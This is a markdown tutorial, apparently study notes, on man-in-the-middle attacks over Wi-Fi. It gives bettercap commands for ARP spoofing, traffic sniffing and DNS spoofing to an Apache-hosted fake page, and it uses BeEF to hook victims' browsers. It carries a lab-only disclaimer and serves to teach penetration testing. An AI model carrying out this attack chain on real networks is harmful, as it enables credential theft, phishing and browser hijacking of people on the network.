# Wi-Fi Penetration Testing — Part 2

> ⚠️ **Disclaimer:** This material is for **educational purposes only**. Performing these attacks on networks or devices without explicit permission is **illegal** and unethical. Always test in a controlled lab environment.

---

## Overview

This section covers **Man-in-the-Middle (MitM) attacks** using `bettercap`, including:
- Network reconnaissance
- ARP Spoofing
- Traffic Sniffing
- DNS Spoofing
- Browser Exploitation with BeEF

---

## 1. Setting Up Bettercap

`bettercap` is a powerful, modular network attack framework. Start it with root privileges:

```bash
sudo bettercap
```

---

## 2. Network Reconnaissance

Discover all active devices on the local network:

```bash
net.probe on   # Actively probes the network to find connected devices
net.show       # Lists all discovered devices with their IP and MAC addresses
```

This gives you a map of every device currently on the network.

---

## 3. ARP Spoofing Attack

**What is ARP Spoofing?**
ARP (Address Resolution Protocol) maps IP addresses to MAC addresses. By sending forged ARP replies, you can trick a target device into routing its traffic through your machine instead of the real gateway — a classic **Man-in-the-Middle** setup.

```bash
set arp.spoof.targets <TARGET_IP>   # Specify the victim device's IP address
arp.spoof on                        # Begin poisoning the target's ARP table
```

---

## 4. Traffic Sniffing

Once ARP spoofing is active, all traffic from the target flows through your machine. Capture it:

```bash
net.sniff on    # Start intercepting and logging network packets
# All HTTP requests, credentials (on unencrypted sites), and browsing activity are now visible
net.sniff off   # Stop sniffing
clear           # Clear the terminal
```

> 🔍 **Note:** HTTPS traffic is encrypted and won't be readable in plaintext. This works best against unencrypted (HTTP) traffic.

---

## 5. DNS Spoofing Attack

**What is DNS Spoofing?**
DNS (Domain Name System) translates domain names (e.g., `amazon.com`) into IP addresses. By poisoning DNS responses, you can redirect a victim to a **fake website** you control instead of the real one.

### Step 1 — Define the spoofed domain

```bash
set dns.spoof.domains myamazon.com   # Requests for this domain will be redirected to your machine
```

### Step 2 — Host a fake website using Apache

```bash
service apache2 start   # Start the Apache web server
ifconfig                # Note your machine's IP address — this is where victims will land
```

Your machine now serves a webpage that victims will be redirected to when they try to visit `myamazon.com`.

### Step 3 — Activate DNS Spoofing

```bash
dns.spoof on   # All users on the network requesting myamazon.com now land on your Apache page
```

---

## 6. Browser Exploitation with BeEF

**What is BeEF?**
BeEF (Browser Exploitation Framework) is a tool that targets web browsers. Once a victim visits a page containing the BeEF hook script, you gain visibility and control over their browser session.

```bash
sudo beef-xss   # Launch the BeEF framework
```

**How it works in this context:**
1. The DNS spoof redirects victims to your Apache-hosted fake page.
2. That page contains the BeEF JavaScript hook.
3. Once loaded in the victim's browser, BeEF gives you a **control panel** showing:
   - Browser type and version
   - Plugins installed
   - Actions the user takes
   - Ability to run further browser-based exploits

---

## Attack Chain Summary

```
[Attacker runs bettercap]
        │
        ▼
[ARP Spoof → MitM position established]
        │
        ▼
[DNS Spoof → Victim redirected to fake site]
        │
        ▼
[Fake Apache site with BeEF hook loads in victim's browser]
        │
        ▼
[BeEF control panel → Full browser visibility & exploitation]
```

---

## Tools Used

| Tool        | Purpose                                      |
|-------------|----------------------------------------------|
| `bettercap` | Network MitM framework (ARP/DNS/sniffing)    |
| `apache2`   | Web server to host the fake/phishing page    |
| `beef-xss`  | Browser exploitation and session hijacking   |

---

## Key Concepts

| Term         | Meaning                                                                 |
|--------------|-------------------------------------------------------------------------|
| ARP Spoofing | Poisoning ARP tables to redirect traffic through the attacker's machine |
| DNS Spoofing | Returning fake DNS responses to redirect users to attacker-controlled sites |
| MitM         | Man-in-the-Middle — attacker sits between victim and the real gateway  |
| BeEF Hook    | A JavaScript payload that gives the attacker control over the victim's browser |